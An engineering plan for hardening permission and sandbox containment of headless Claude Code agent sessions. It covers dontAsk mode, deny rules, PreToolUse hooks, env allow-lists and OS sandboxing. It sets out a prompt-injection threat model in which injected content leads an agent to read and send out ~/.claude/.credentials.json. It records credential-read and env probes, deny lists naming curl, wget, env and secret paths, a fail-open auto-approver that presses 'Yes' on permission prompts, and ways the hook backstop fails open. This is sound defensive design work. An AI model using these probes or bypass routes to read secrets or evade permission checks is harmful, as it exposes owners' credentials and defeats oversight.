# Tool Security Redesign — Plan

> ## ⚠️ SPIKE-VERIFIED + DEEPENED 2026-07-20 — READ BEFORE THE PLAN BELOW
>
> An adversarial security review plus **two empirical spikes on the installed CC 2.1.215**
> settled the linchpin questions. Where this block conflicts with the plan below, THIS WINS.
>
> ### S7 + S8 RESULTS (run against real `claude -p --permission-mode dontAsk`, not docs)
>
> | probe, `--tools Bash`, NO allow rule | result |
> |---|---|
> | `cat <file-in-cwd>` | **RAN** |
> | `cat ~/.ssh/known_hosts`, `cat ~/<home>/credentials.json` (out of cwd) | **DENIED** |
> | `env \| grep SECRET` | **DENIED** |
> | `curl https://example.com` (egress) | **DENIED** |
> | `cat` with a `--disallowed-tools "Bash(cat:*)"` deny rule | **DENIED** |
> | `cat /etc/hosts && cat ~/.ssh/known_hosts` | **DENIED, silently** — 0 prompt frames rendered, process exited 0 in 24s, agent explained the denial and continued |
>
> **CONCLUSION — the design is VIABLE, and both the original doc and the review were wrong:**
> - The original doc's claim that `dontAsk` is *total* default-deny is FALSE — it auto-allows
>   reading files **inside the working directory**.
> - The review's implication that credential reads run is ALSO FALSE — out-of-cwd reads, `env`,
>   and network egress are all denied.
> - **The real boundary:** `dontAsk` auto-allows in-cwd reads and denies everything else;
>   `permissions.deny` rules are authoritative. **Containment recipe:** scope a caller's cwd to a
>   dedicated non-sensitive directory + deny rules for the rest. That holds.
> - **S7 (migration linchpin) PASSES:** `dontAsk` denies with NO prompt rendered. So the
>   `tool-use-approve` auto-presser (`spawn.ts:239-245`) has nothing to press — we can drop
>   `--dangerously-skip-permissions` WITHOUT fail-open and WITHOUT wedging headless REPLs.
>
> ### CORRECTIONS THE REVIEWS FORCED (all re-verified against code)
>
> 1. **8 `skip_permissions: true` sites, not 4.** §1.4 misattributes the memory-lane substrates to
>    `makeEphemeralSubstrate`. They are built inline: `open/wiring/memory.ts:132/255/352`. Plus
>    `open/composer.ts:961` (cc-synthesis, the history-import / untrusted-input caller) and the four
>    in `open/wiring/substrates.ts:173/226/296/343`. Phase B executed against the old map would edit
>    the wrong three files and **leave the memory lane on bypass while recording it migrated.**
> 2. **The memory lane is already toolless** (`tools: []` at `scribe/extract.ts:157`,
>    `reflection/detector.ts:134`, `scribe/reflect/reflect-pass.ts:908`) and writes via in-process
>    functions, NOT agent tools. §4.2's proposed `Read,Grep,Glob` for that class would *widen* it.
>    Correct §4.2 to `tools: []` for the memory substrates and record the invariant: memory-lane
>    substrates are toolless; persistence is in-process.
> 3. **PreToolUse is NOT an authoritative backstop** — hook timeout (600s default), a non-2 exit, or
>    garbage stdout all **fail OPEN**. And if the env allow-list drops `PATH`, the hook (`bun ...`)
>    can't launch — silently disabling the backstop. Never design a control whose only enforcement
>    is PreToolUse; mirror every deny as a `permissions.deny` rule.
> 4. **Phase D and Phase E contradict.** The sandbox introduces network-approval prompts `dontAsk`
>    does not suppress; deleting the auto-presser (E) before proving headless sandbox-network
>    behaviour (S6) ends in a 3am wedge. Prefer an empty network allow-list (no egress) for rituals.
> 5. **Migration: flip the presser from YES to NO, don't gate it off.** `keys:['1','enter']` →
>    the deny selection. Fail-closed in every intermediate state, clears residual prompts so nothing
>    wedges, and removes S7 from the migration's critical path. Strictly better than §5's staged plan.
> 6. **STEP 0 (new, prerequisite): the `SubstrateProfile` refactor.** 8 hand-copied
>    `buildLlmCallSubstrate` option bags collapse into one profile-taking factory. Without it, the
>    no-feature-flags rule and any staged permission migration are mutually exclusive (a mode-gated
>    scanner is a dual code path). This is what turns Phase B from 8 risky edits into flipping N
>    constants.
> 7. **A real-install probe is required** (the doc has only throwaway-REPL spikes): after the flip,
>    on a live install, assert a real chat turn still edits a project file, a real scribe extraction
>    still writes an entity page, and a real reflect pass completes. `dontAsk` denying something the
>    product legitimately needs is a silent capability regression.
>
> ### SHIPPED ALREADY (PR #411, independent of this redesign)
> Interpreter-injection env vars (`NODE_OPTIONS`/`LD_PRELOAD`/`DYLD_INSERT_LIBRARIES`/…) stripped in
> `mergeEnv`; the MCP sink-token config file moved to a per-spawn 0700 dir / 0600 files / 16-byte
> entropy; the settings file 0644→0600. STILL OPEN for this redesign: the MCP bridge's per-PROCESS
> sink token + missing session check before `/tool-call` dispatch (`pool-state.ts:156` vs `:192`),
> and the `ensure-claude-trust.ts` lost-update race.
>
> ### REVISED BUILD ORDER (supersedes §9)
> Step 0 `SubstrateProfile` refactor (behaviour-preserving) → memory build (see the memory doc; it
> ships first because its substrates are toolless so the permission flip is a no-op for them) →
> Phase A (CLAUDE_CONFIG_DIR scope, env allow-list, per-tool manifest check) → Phases B+C+E as ONE
> atomic PR (flip all callers to dontAsk, write permissions blocks, delete the presser, add the
> real-install probe) → Phase D native sandbox (gated on S6) → ritual Bash work.


> **STATUS: COMPLETE (plan only — no build).**
> Date: 2026-07-20. Author: Atlas. Ryan-directed. Branch:
> `tool-security-redesign-2026-07-20` @ base cb870667. Verified against Claude Code
> **2.1.215** docs + repo source read on 2026-07-20.
>
> Trigger: a security review proved the current containment model fails open. Dropping
> `--dangerously-skip-permissions` does NOT fail closed, because the substrate's
> tool-use-approve scanner auto-presses "yes" on any rendered permission prompt.
> Ryan's direction: "Claude now has some kind of auto approval lists or something
> which didn't exist when we first built this. We might move to a different mechanism
> than --dangerously-skip-permissions."

## Executive summary

Ryan's intuition is correct and it resolves the problem. Claude Code 2.1.x now ships two
mechanisms that did not exist when the substrate was written:

1. **`dontAsk` permission mode** — a genuine default-deny, headless-safe mode. An
   unmatched tool call is **denied immediately with no prompt rendered** (§2.2). This is
   the key: with no prompt, there is nothing for the fail-open auto-approver to press, so
   we can move off `--dangerously-skip-permissions` WITHOUT the fail-open problem and
   WITHOUT wedging unattended REPLs.
2. **Native OS sandboxing** (`sandbox.*` settings — macOS Seatbelt / Linux bubblewrap,
   §2.4) — confines what a **Bash** child process can write, read, and reach on the
   network. Permission rules cannot do this; the sandbox can. It is the containment a
   granted-Bash ritual requires.

The redesign spine: **`dontAsk` (fail-closed) + `--tools` (surface, keep as-is) +
`permissions` allow/deny (path/command) + PreToolUse deny hook (authoritative backstop) +
native sandbox (OS confinement for Bash) + env allow-list (blast radius) + scoped
`CLAUDE_CONFIG_DIR` (no global-config mutation).** No single global setting; each of the
three callers composes the subset it needs (§4).

**The one experiment that gates everything: spike S7** — prove that on 2.1.215, `dontAsk`
renders NO prompt for the key-to-kingdom paths that bypass mode still prompts on
(`.git/hooks/*`, out-of-root writes), denies them, and lets the agent continue. Nothing in
the migration is trusted until S7 passes. Straight answers to the two hard questions:
**OS sandboxing IS required for any Bash caller** (use CC's native sandbox first; separate
uid/container only if spike S6 shows it insufficient); the **shared `~/.claude.json` trust
writes are NOT acceptable** and should be scoped via `CLAUDE_CONFIG_DIR`.

## Contents

1. Current-state map (file:line, verified)
2. What Claude Code supports today (version-pinned, cited)
3. Threat models: the three callers
4. Per-caller design
5. Auto-approver migration path
6. OS-level sandboxing: straight answer
7. Shared ~/.claude.json trust writes
8. Credential blast radius (env allow-list)
9. Phased build order + required spikes
10. What we deliberately do NOT change

---

## 1. Current-state map (verified 2026-07-20, branch `tool-security-redesign-2026-07-20` @ cb870667)

Every claim below re-verified by direct read on this date. Paths relative to repo root.

### 1.1 The only real gate: `--tools` (default-deny, survives skip-permissions)

- `runtime/adapters/claude-code/persistent/build-repl-argv.ts:93-99` — `--tools` is
  ALWAYS emitted. Empty/undefined → `--tools ""` (every built-in disabled);
  populated → comma allow-list. The field doc (`build-repl-argv.ts:51-63`) names the
  canonical attack this blocks: prompt-injection in imported untrusted content telling
  the agent to `cat ~/.claude/.credentials.json` via Bash would auto-execute under
  skip-permissions without this gate. The doc also records the empirical finding that
  `--allowed-tools` does NOT restrict the built-in surface; only `--tools` does.
- `build-repl-argv.ts:100-106` — `--allowedTools` is emitted only for MCP namespaces
  (e.g. `mcp__neutron`) when the tool bridge is attached; orthogonal to `--tools`.
- `build-repl-argv.ts:107-109` — `--dangerously-skip-permissions` appended iff
  `skipPermissions === true`.

### 1.2 The auto-approver that makes "drop skip-permissions" fail OPEN

- `runtime/adapters/claude-code/persistent/spawn.ts:239-246` — a `tool-use-approve`
  scanner is registered on EVERY repl session, unconditionally. When the screen
  matches both cues it presses `1` + `enter` ("Yes"), debounced 5s, fire-once per
  rising edge.
- `runtime/adapters/claude-code/persistent/signatures.ts:89-90` —
  `TOOL_USE_QUESTION_RE = /doyouwantto(makethisedit|proceed|runthiscommand|create)/i`
  and `TOOL_USE_SELECTOR_RE = /❯1\.yes/i`. Note `runthiscommand`: **Bash approvals
  are auto-pressed too.**
- **Critical nuance** (`signatures.ts:83-88`, comment): these prompts render **even
  under `--dangerously-skip-permissions`** for "key-to-kingdom" paths —
  `.git/hooks/*`, writes outside the project root. So today the auto-approver is not
  merely a no-skip-permissions artifact: it ALSO auto-approves the prompts CC
  considers too dangerous to bypass even in bypass mode. The current system therefore
  has a strictly WIDER effective grant than `--dangerously-skip-permissions` alone.
- Consequence: removing `--dangerously-skip-permissions` (as the rituals containment
  plan proposed) makes CC render permission prompts for out-of-scope writes and the
  substrate auto-presses YES on all of them, including Bash. Fail-open, verified.

### 1.3 No `permissions` config anywhere

- `runtime/adapters/claude-code/persistent/build-settings.ts:36-53` — the per-session
  `--settings` JSON contains ONLY a `Stop` hook (enforce-reply). `BuildSettingsInput`
  (`build-settings.ts:23-30`) has no permissions/rules field. Grep for `PreToolUse`
  across the repo: zero implementation (only the research doc cited in §2 mentions it).

### 1.4 All four substrate call sites hardcode skip-permissions

`open/wiring/substrates.ts`:
- `:173` — `cc-llm-<owner>` (warm utility LLM-call substrate): `skip_permissions: true`
- `:226` — `cc-agent-<owner>` (warm per-project CHAT repl): `skip_permissions: true`
- `:296` — `makeEphemeralSubstrate` (`cc-scribe-*`, `cc-reflect-*`, other one-shots):
  `skip_permissions: true` hardcoded
- `:343` — `cc-trident-fire-*` (workflow fire seam): `skip_permissions: true`

There is no code path that spawns a managed REPL without skip-permissions.

### 1.5 Shared global config mutation on every spawn

- `runtime/adapters/claude-code/persistent/ensure-claude-trust.ts:82-90` — every spawn
  writes `bypassPermissionsModeAccepted: true`, `hasCompletedOnboarding: true`, and
  per-cwd `hasTrustDialogAccepted: true` into `~/.claude.json` (default `homedir()`;
  a `configDir` override exists at `:65-68` but production callers don't use it —
  verified: the only non-test caller passes no `configDir`). This mutates the owner's
  GLOBAL claude config, affecting non-Neutron `claude` usage.

### 1.6 Credential blast radius: full process.env inheritance

- `runtime/adapters/claude-code/persistent/repl-session.ts:410-426` — `mergeEnv`
  starts from `{ ...process.env }`; the overlay contract deletes only the three
  Anthropic auth vars and sets the selected pool credential. Every OTHER secret in
  the gateway's environment (and any file readable by the gateway uid) is visible to
  any child that holds Bash or Read outside `--tools ""`.

### 1.7 MCP bridge: namespace-level grant, no per-tool manifest check at dispatch

- `runtime/adapters/claude-code/persistent/pool-state.ts:155-190` — the
  `/tool-call` HTTP path dispatches whatever `tool_name` arrives to
  `bridge.dispatch(...)` with only project-id scoping. There is no check of the tool
  name against a per-session manifest; the grant is all-or-nothing at the
  `--allowedTools mcp__<ns>` namespace level (§1.1). Capability checks, if any, live
  inside individual handlers ("capability denied" is one of the normal error paths,
  `pool-state.ts:184-189`), not at the dispatch boundary.

### 1.8 Binary/version

- `build-repl-argv.ts:84` — binary resolves `input.claudeBin ?? process.env['CLAUDE_BIN']
  ?? 'claude'`. No version pin in the repo (verified: no CC version in package.json /
  bun.lock). Installed on this host today: **Claude Code 2.1.215** (`claude --version`,
  2026-07-20). Prior empirical permission research in this repo was run on 2.1.195
  (`docs/research/trident-v2-prototype2-2026-06-28.md`). All "what CC supports" claims
  in §2 are pinned to 2.1.215 docs unless marked otherwise.

## 2. What Claude Code supports today (verified against 2.1.215 docs, fetched 2026-07-20)

Sourced from official docs at `code.claude.com/docs` via the `claude-code-guide` agent
on 2026-07-20. Doc URLs cited per claim. Items the docs did not confirm are marked
UNVERIFIED and become spikes in §9. **This is the crux: the mechanisms Ryan intuited
("auto approval lists ... which didn't exist when we first built this") now exist —
in particular a genuine default-deny headless mode and native OS sandboxing.**

### 2.1 `permissions` in settings.json — allow / deny / ask + `defaultMode`

Docs: `permissions.md`, `settings.md`. Schema:

```json
{
  "permissions": {
    "defaultMode": "default|acceptEdits|plan|auto|dontAsk|bypassPermissions",
    "allow": ["Bash(npm run *)", "Read(~/.zshrc)", "WebFetch(domain:example.com)"],
    "deny": ["Bash(rm -rf *)", "Read(.env)"],
    "ask": ["Bash(git push *)"]
  }
}
```

- **Matching grammar:** bare tool name matches all uses; `Bash(ls *)` enforces a word
  boundary (matches `ls -la`, not `lsof`), `Bash(ls*)` does not; path patterns support
  absolute (`//tmp/...`), home (`~/...`), project-root (in a project settings file),
  and cwd-relative globs; `WebFetch(domain:*.github.com)` matches domains; MCP tools
  match `mcp__<server>__<tool>` prefixes.
- **Precedence: deny → ask → allow**, first match wins, specificity does NOT reorder.
  A deny beats any narrower allow. Deny rules are globally binding and MERGE across
  scopes.
- **Settings-file precedence:** managed/enterprise (highest, unoverridable) → CLI args
  (`--settings`, `--allowedTools`, `--permission-mode`) → `.claude/settings.local.json`
  → `.claude/settings.json` → `~/.claude/settings.json`. Arrays merge; deny from any
  scope binds.

### 2.2 The default-deny answer: `dontAsk` mode

Docs: `permission-modes.md`. **This is the single most important finding.** There IS a
mode where an unmatched tool call is **denied immediately, with no prompt rendered**:
`dontAsk`. Modes and their unmatched-call behavior:

| Mode | Unmatched call | Headless `-p` behavior |
|---|---|---|
| `default` | **Prompts** | exits/hangs (no stdin to answer) |
| `acceptEdits` | auto-approves edits + `mkdir/rm/mv/cp/sed/touch` in cwd+addDirs; others fail | non-auto-approved tools fail |
| `plan` | reads run; writes blocked | blocked writes abort; reads continue |
| `auto` | a **classifier** approves/denies per safety rules (needs Sonnet 4.6+/Opus 4.6+/Fable 5) | classifier runs; blocks abort |
| **`dontAsk`** | **denies immediately** | **tool fails silently, agent continues** |
| `bypassPermissions` | auto-approves (circuit breakers only) | all auto-approved |

`dontAsk` is the fail-closed, unattended-safe mode: it never renders a prompt, so there
is nothing for the auto-approver to press, and an unmatched call fails cleanly instead
of hanging. Exceptions that are DENIED (not prompted) under `dontAsk`: explicit `ask`
rules, `AskUserQuestion`, MCP `requiresUserInteraction` tools. Set via
`--permission-mode dontAsk` or `permissions.defaultMode: "dontAsk"`.

### 2.3 PreToolUse hooks — authoritative deny, even under bypass

Docs: `hooks.md`, `permissions.md`. Hooks run BEFORE the deny/ask/allow rules. Contract:

- stdin JSON includes `tool_name`, `tool_input` (so a hook CAN inspect the Bash command
  string and file paths), `permission_mode`, `cwd`.
- exit `0` + `{"hookSpecificOutput":{"permissionDecision":"allow|deny|ask"}}` → decision
  applies; exit `0` no JSON → normal flow; **exit `2` → blocks the call authoritatively,
  and this holds even in `bypassPermissions` mode**; other non-zero → non-blocking error.
- **Authority nuance:** a hook `allow` does NOT override a `deny`/`ask` rule (rules still
  evaluate). A hook `deny` (exit 2) is authoritative. So hooks can only TIGHTEN, never
  loosen — which is exactly what a containment layer wants.

This confirms the prior in-repo research
(`docs/research/trident-v2-prototype2-2026-06-28.md:107,257`) that named "dontAsk +
allowlist + PreToolUse deny hook" as the design. It was never implemented (grep: zero
PreToolUse in the codebase). That prior design is essentially correct and is most of the
answer.

### 2.4 Native OS sandboxing — NEW, ships in CC (`sandbox.*` settings, `/sandbox`)

Docs: `sandboxing.md`. **This did not exist when the substrate was written and it
directly changes the §6 answer.** Claude Code now has built-in OS-level sandboxing:

- **Platforms:** macOS (Seatbelt), Linux/WSL2 (bubblewrap). NOT WSL1 or native Windows.
- **Filesystem:** default write = cwd + session temp; configurable via
  `sandbox.filesystem.allowWrite / allowRead / denyRead`. Enforced at the OS level, so
  **it confines what a Bash child process writes** — not just the Edit/Write tools.
- **Network:** domain allow-list via proxy; first new domain prompts (interactive) —
  needs handling for headless.
- **Credentials:** `sandbox.credentials.files[].mode: "deny"` blocks reads;
  `"mask"` substitutes a sentinel — directly relevant to the credential blast radius (§8).
- **Child processes inherit restrictions** (OS enforcement), and settings files are
  auto-protected from writes.
- **Orthogonality (key):** permissions decide IF a tool runs; the sandbox decides WHAT
  the resulting process can touch. The docs note the sandbox "restricts Bash but not file
  tools" — i.e. it governs shell/child-process side effects at the OS boundary, which is
  precisely the gap a granted-Bash ritual opens (§3.3, §6).

### 2.5 Other mechanisms

- **`--allowedTools` / tool surface** is orthogonal to permission MODE: it restricts the
  available toolset before permissions even evaluate. (Repo empirically found `--tools`
  gates built-ins where `--allowed-tools` did not, §1.1 — the docs describe
  `--allowedTools` as the allow-list; the repo's own note that it "does not restrict the
  built-in surface" is a discrepancy worth a spike, S1.)
- **`canUseTool` callback** — Agent SDK only (TS/Python), NOT the CLI. Runs after
  hooks/deny/ask/mode. Not applicable unless Neutron moves off the CLI to the SDK.
- **`--permission-prompt-tool <mcp_tool>`** — routes a headless permission prompt to a
  named MCP tool. Contract UNVERIFIED in docs (spike S2). Potentially interesting for
  caller 1 but not needed if we use `dontAsk`.
- **`additionalDirectories`** — extends readable/writable dirs without prompts; does NOT
  load config from added dirs. This is a GRANT, not a jail (an `--add-dir` widens, never
  narrows — matches the executor-plan finding).

### 2.6 What the docs did NOT confirm (→ spikes)

- **Do `permissions.deny` rules apply under `bypassPermissions`?** Docs silent. Load-
  bearing: if deny survives bypass, a bypass caller could still be fenced by deny rules;
  if not, bypass is all-or-nothing. **Spike S3.**
- **Per-config-dir / per-project scoping of `bypassPermissionsModeAccepted`** (via
  `CLAUDE_CONFIG_DIR`): no documented mechanism found. The docs' own hardened-spawner
  recommendation is to **avoid bypass entirely and use `dontAsk` + explicit rules**,
  which sidesteps the global-state write. **Spike S4** (does `CLAUDE_CONFIG_DIR`
  isolate the config file at all).
- **`--permission-prompt-tool` contract** — **Spike S2**.

### 2.7 Headline consequence

The docs' own fail-closed unattended recipe is:

```bash
claude -p --permission-mode dontAsk \
  --allowedTools "Read,Bash(npm run *)" \
  --settings <(...allow/deny rules...) "task"
```

That is a genuine default-deny, no-prompt-ever posture. It means Neutron can move off
`--dangerously-skip-permissions` for the unattended callers WITHOUT the fail-open
auto-approver problem — because in `dontAsk` no prompt is ever rendered, so there is
nothing to auto-press. The design in §4 is built on this.

## 3. Threat models: the three callers

A single global setting is wrong because the three callers differ on two axes that
drive the whole design: **(a) does untrusted content enter the context?** and **(b)
is a human present to catch a bad action?** The tool surface each needs is a third,
mostly-independent axis.

| Caller | Substrate ids | Untrusted input? | Human present? | Needs Write? | Needs Bash? |
|---|---|---|---|---|---|
| 1. Warm CHAT repl | `cc-agent-*` | **YES** — imported history, email, docs, web, pasted text | YES (owner in the loop) | Yes (project files) | No by default |
| 2. Ephemeral utility | `cc-llm-*`, `cc-scribe-*`, `cc-reflect-*` | Sometimes (scribe reads owner data; llm-call processes arbitrary prompt args) | **NO** | No (read-only intent today) | No |
| 3. Scheduled ritual | proposed `cc-ritual-*` | Indirect (prompt is owner-approved, but reads live data that may contain injection) | **NO** | **Yes** (some rituals) | **Maybe** (Ryan: rituals may hold Bash if approved) |

### 3.1 Caller 1 — warm CHAT repl (`cc-agent-*`)

The highest-value target and the hardest, because untrusted content and real
capability meet in one session. The canonical attack is exactly the one
`build-repl-argv.ts:51-63` documents: a prompt-injection inside imported ChatGPT
history or a fetched web page instructs the agent to exfiltrate
`~/.claude/.credentials.json` (or any other secret reachable via §1.6's inherited
env) using whatever tools it holds. The owner is present, but injection is designed
to act in a single tool call before a human notices — presence is a mitigation, not
a control. Write is legitimately needed (the agent edits project files), which is
why this caller cannot simply run read-only.

Threats: (a) credential exfiltration via Bash/Read + a network tool; (b) writes
outside the project root (`~/.claude/`, `.git/hooks/*`, sibling repos); (c) using an
MCP tool the session was never meant to hold (§1.7).

### 3.2 Caller 2 — ephemeral utility substrates (`cc-llm-*`, `cc-scribe-*`, `cc-reflect-*`)

One-shot, no human, read-only in intent. Because there is no human, a rendered
permission prompt cannot be answered — the containment MUST be fail-closed by
construction, never "ask". These process owner data (scribe summarizes; reflect reads
memory) and `cc-llm-*` runs arbitrary prompt text, so injected instructions can
arrive. But their INTENT needs no Write and no Bash, so the correct surface is a
tight read-only allow-list. The risk today is not that they're mis-scoped in intent
— it's that skip-permissions + the auto-approver means an injection that talks one
of them into a Bash call would be auto-approved (they get `--tools ""` today which
blocks built-in Bash, but see §1.7: an MCP tool with side effects is a different
path, and the namespace grant is coarse).

### 3.3 Caller 3 — scheduled ritual executors (`cc-ritual-*`, proposed)

Unattended, on a cadence, and the only caller that may legitimately hold Write and
possibly Bash. This is where the redesign's stakes concentrate, for reasons the
executor-mode deepened review (`docs/plans/executor-mode-reminders-2026-07-20.md`)
established and I re-verified:

- **No human, ever.** Same fail-closed requirement as caller 2, but with a larger
  surface. A rendered prompt = a wedged unattended run.
- **The risk is in fire #500, not fire #1.** A ritual's prompt file is bytes on disk
  and mutable after approval; its cadence can be re-cadenced; anything it reads live
  (email, web, memory) is an injection vector on every fire. So containment cannot be
  a one-time check — it must re-bind at every fire (content-hash, per that plan).
- **With Bash, containment is OS-level or nothing.** `bash -c 'echo x > /outside'`
  is not an `Edit` call; path-based deny/allow rules in Claude Code govern the
  Edit/Write/Read tools, not what a shell child does after Bash is granted. This is
  the pivotal design fork and §6 answers it head-on.

### 3.4 Consequence for the design

Because callers 2 and 3 have NO human, any mechanism that resolves an unmatched tool
call by *asking* is unusable for them — it wedges the run. They need a mode where
unmatched ⇒ **deny**, silently, with the agent continuing. Whether Claude Code 2.1.x
offers that natively is the single most important thing §2 must establish; if it does
not, callers 2 and 3 fall back to `--tools` allow-listing (built-ins) + no-Bash +
OS-level containment for any writing ritual. Caller 1 has a human and can tolerate an
"ask" for the rare edge, but its untrusted-input exposure means its default-deny
posture still matters most for the auto-exfiltration path.

## 4. Per-caller design

Shared foundation for ALL callers (replaces the skip-permissions + auto-approver model):

- **Move the default permission mode from `bypassPermissions` (via
  `--dangerously-skip-permissions`) to `dontAsk`** (`--permission-mode dontAsk`, §2.2).
  Unmatched ⇒ deny, no prompt. This is the mechanism that lets us delete the fail-open
  auto-approver (§5) without wedging.
- **Keep `--tools` default-deny** (§1.1) as the built-in surface gate — it is verified
  and holds. `--tools` + `dontAsk` are complementary: `--tools` bounds which built-ins
  exist; `dontAsk` + `permissions.allow/deny` bound what those built-ins may touch.
- **Write real `permissions` into the per-session `--settings`** (today it carries only
  the Stop hook, §1.3). Add a `permissions` block per caller with `defaultMode: dontAsk`
  and explicit `allow`/`deny`.
- **A PreToolUse deny hook** as the authoritative backstop (§2.3) for path/command
  patterns that must never run regardless of mode — this is the one layer that holds
  even if a bypass caller slips through.
- **Scope config writes** off the owner's global `~/.claude.json` (§7).
- **Env allow-list** for no-human / Bash-holding callers (§8).

Per-caller specifics:

### 4.1 Caller 1 — warm CHAT repl (`cc-agent-*`)

- **Mode:** `dontAsk` (NOT bypass). The owner is present, but `dontAsk` + a good
  allow-list means the common project-edit path never prompts, while an injected
  out-of-scope action is denied silently rather than auto-approved.
- **Built-in surface (`--tools`):** the project-work set the chat agent legitimately
  needs — `Read, Edit, Write, Grep, Glob`, and `Bash` IF the project's workflow needs it
  (many will). Where Bash is granted, it is the untrusted-input caller, so it MUST be
  paired with §4.4 sandboxing and the §8 env allow-list.
- **`permissions.allow`:** project-root reads/writes (`Edit(/**)`, `Read(/**)` relative
  to project root), the project's expected `Bash(<cmd> *)` prefixes.
- **`permissions.deny` (authoritative via PreToolUse hook too):** `Read(~/.claude/**)`,
  `Read(~/.ssh/**)`, `Read(**/.credentials.json)`, `Read(**/.env*)`, `Edit(~/.claude/**)`,
  `Edit(.git/hooks/**)`, writes outside project root, `Bash(env)`, `Bash(curl *)` /
  `Bash(wget *)` unless a project explicitly needs egress. The deny-list is a backstop;
  the primary containment is that `dontAsk` denies anything not in `allow`.
- **Untrusted-input hardening:** because imported history/email/web enter here, the
  network-egress tools (`WebFetch`, `Bash(curl)`) are the exfil channel — gate them
  tightly and treat any egress as a reviewed capability.

### 4.2 Caller 2 — ephemeral utility (`cc-llm-*`, `cc-scribe-*`, `cc-reflect-*`)

- **Mode:** `dontAsk`. No human ⇒ must be fail-closed; `dontAsk` guarantees no prompt is
  ever rendered.
- **Built-in surface:** read-only. `--tools Read,Grep,Glob` (or `--tools ""` for the pure
  LLM-call substrate that needs no filesystem at all). **No Write, no Bash.** This matches
  their read-only intent (§3.2).
- **`permissions`:** `defaultMode: dontAsk`, `allow: [Read(<scope>/**), Grep, Glob]`,
  `deny` the credential/secret paths as in §4.1. Since they hold no Write/Bash built-in,
  the deny-list is belt-and-suspenders.
- **Env:** strict allow-list (§8) — these never need the gateway's secret set.
- **MCP:** only the specific namespace they use; and close the §1.7 gap (per-tool
  manifest check at dispatch) so a coarse namespace grant can't be abused.

### 4.3 Caller 3 — scheduled ritual executors (`cc-ritual-*`, proposed)

This is where the design earns its keep. Two sub-classes, because Bash changes everything:

**4.3a Read-only / Write-to-scope rituals (morning-brief, evening-wrap, book-refresh,
daily-delta notes):**

- **Mode:** `dontAsk`. No human ⇒ fail-closed.
- **Surface:** `Read, Grep, Glob` and, if the ritual writes notes, `Edit, Write`
  confined to its scope dir via `permissions.allow: [Edit(<scope>/**)]` +
  `deny: [Edit(/**) outside scope]`. **No Bash.**
- **These can ship first** — Layer 1 (`--tools`) + `dontAsk` + scope allow-list genuinely
  contains a no-Bash writer, and all of it is verified/native today.

**4.3b Bash-holding rituals (kaizen, dreaming, anything Ryan approves for shell):**

- **Mode:** `dontAsk` + `permissions.allow` of the SPECIFIC `Bash(<cmd> *)` prefixes the
  ritual needs (never bare `Bash`) + a PreToolUse deny hook for destructive patterns.
- **BUT** — and this is the load-bearing point from §3.3/§6 — permission rules govern the
  Edit/Write/Read tools and the Bash *invocation*, not what the shell child does after it
  starts. `Bash(git log *)` being allowed doesn't stop `git log; env > /outside` inside a
  single approved-prefix call unless the command string is fully constrained (which a
  prefix rule does not do). **Therefore a Bash ritual REQUIRES OS-level sandboxing
  (§4.4/§6), not just permission rules.**
- **Approval binding:** per the executor-mode plan, a Bash ritual is inert until the
  owner approves it, approval binds to a content hash of (prompt ‖ surface ‖ scope ‖
  cadence ‖ model ‖ timeout) and re-verifies every fire. That plan owns the approval
  mechanism; this doc owns the *containment* the approval authorizes.

### 4.4 Native sandbox applied per caller

Because CC now ships OS sandboxing (§2.4), the containment for shell side effects is a
config layer, not a separate process supervisor (subject to spike S6):

- **Caller 3b (Bash rituals):** `sandbox.filesystem.allowWrite: [<scope dir>, temp]`,
  everything else read-only or denied; `sandbox.credentials.files[]` set to `deny`/`mask`
  for `~/.claude/.credentials.json`, `~/.ssh`, `.env` files; `sandbox.network` domain
  allow-list (empty for a no-egress ritual). This confines the shell child at the OS
  boundary — the thing permission rules cannot do.
- **Caller 1 (Bash-in-chat):** same sandbox filesystem confinement to project root +
  credential deny; network allow-list scoped to what the project needs.
- **Callers 2 & 3a (no Bash):** sandbox is defense-in-depth (cheap to enable) but the
  no-Bash + read-only surface already contains them; enable it anyway for the
  credential-file deny (protects against a future surface widening).

The design's spine: **`dontAsk` (fail-closed) + `--tools` (surface) + `permissions`
(path/command allow-deny) + PreToolUse hook (authoritative backstop) + native sandbox
(OS confinement for Bash) + env allow-list (blast radius) + scoped config dir (no global
mutation).** No single global setting; each caller composes the subset it needs.

## 5. Auto-approver migration path

**The constraint (§1.2):** the `tool-use-approve` scanner
(`spawn.ts:239-246`) cannot simply be deleted. It exists because every REPL runs under
`--dangerously-skip-permissions`, which STILL renders prompts for key-to-kingdom paths
(`.git/hooks/*`, writes outside project root) — and a headless REPL with no one to press
the key would WEDGE on the first such prompt. Delete the presser without changing the
mode and every REPL hangs; keep it while dropping skip-permissions and it auto-approves
everything (fail-open). The mode change and the presser removal must happen together.

**Why `dontAsk` dissolves the problem:** in `dontAsk` mode, an out-of-scope /
key-to-kingdom action is **denied without rendering a prompt at all** (§2.2). There is no
"Do you want to..." screen for the scanner to match, so `TOOL_USE_QUESTION_RE` never
fires. The auto-approver becomes dead code precisely because the thing it was pressing no
longer appears. The agent gets a clean tool-failure and continues.

**Migration sequence (must be atomic per caller):**

1. **Spike S3 first** (does `permissions.deny` apply under bypass?) and **S7** (confirm
   `dontAsk` on 2.1.215 truly renders NO prompt for `.git/hooks/*` and out-of-root
   writes — the exact paths §1.2's comment says bypass still prompts on). This is the
   pivotal empirical check; nothing ships until it passes. Run it as a throwaway REPL
   that attempts each key-to-kingdom action under `dontAsk` and asserts (a) the action is
   denied, (b) NO permission prompt text ever hits the ring, (c) the agent turn
   completes rather than hanging.
2. **Per caller, flip mode `bypass → dontAsk` and write `permissions` in the same
   change.** Do NOT remove the presser yet.
3. **Once S7 confirms no prompt renders under `dontAsk`,** make the `tool-use-approve`
   scanner registration CONDITIONAL: register it ONLY for a session still spawned under
   skip-permissions/bypass (if any remain). For `dontAsk` sessions, do not register it.
   Concretely: gate the `session.scanner.register({id:'tool-use-approve',...})` call at
   `spawn.ts:239` on the session's permission mode.
4. **When the last caller is off bypass, delete the scanner + its signatures**
   (`signatures.ts:89-90`) entirely. Until then it stays for any residual bypass caller
   (e.g. if one caller is deferred), gated so it can never fire on a `dontAsk` session.
5. **Keep the OTHER scanners** — the `/rate-limit-options` auto-stop
   (`spawn.ts:247+`) and the P0 wedge-recovery detector are unrelated to permissions and
   must survive. Only `tool-use-approve` is coupled to the permission model.

**Ordering rule:** never have a caller in a state where it renders permission prompts AND
has no presser (wedge), nor one where it renders prompts AND auto-presses (fail-open). The
safe transition is bypass+presser → (flip to dontAsk, prompts stop rendering) → remove
presser. The presser removal LAGS the mode flip and is gated on S7 proof.

